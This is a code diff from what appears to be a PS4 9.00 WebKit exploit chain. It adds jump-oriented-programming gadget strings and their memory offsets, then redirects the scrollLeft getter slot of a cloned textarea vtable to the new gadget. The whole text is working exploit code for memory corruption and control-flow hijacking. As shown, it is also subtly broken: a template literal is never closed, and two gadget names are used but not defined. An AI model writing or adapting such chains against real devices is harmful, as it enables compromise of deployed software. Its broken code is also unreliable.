@@ -80,6 +80,10 @@ let libc_base = null;
 //
 // When the scrollLeft getter native function is called on PS4 9.00, rsi is the
 // JS wrapper for the WebCore textarea class.
+const ta_jop1 = `
+mov rdi, qword ptr [rsi + 0x18]
+mov rax, qword ptr [rdi]
+call qword ptr [rax + 0xb8]
 const jop1 = `
 mov rdi, qword ptr [rsi + 0x20]
 mov rax, qword ptr [rdi]
@@ -178,6 +182,10 @@ const webkit_gadget_offsets = new Map(Object.entries({
     [jop4] : 0x0000000000303906,
     [jop5] : 0x00000000028bd332,
     [jop6] : 0x000000000004e293,
+
+    [ta_jop1] : 0x00000000004e62a4,
+    [ta_jop2] : 0x00000000021fce7e,
+    [ta_jop3] : 0x00000000019becb4,
 }));
 
 const libc_gadget_offsets = new Map(Object.entries({
@@ -521,7 +529,7 @@ class Chain900 extends Chain900Base {
         clone_p.write64(0, ta_p.read64(0));
 
         // 0x1b8 is the offset of the scrollLeft getter native function
-        rw.write64(vtable_clone, 0x1b8, this.get_gadget(jop1));
+        rw.write64(vtable_clone, 0x1b8, this.get_gadget(ta_jop1));
 
         // for the JOP chain
         const rax_ptrs = new Uint8Array(0x100);
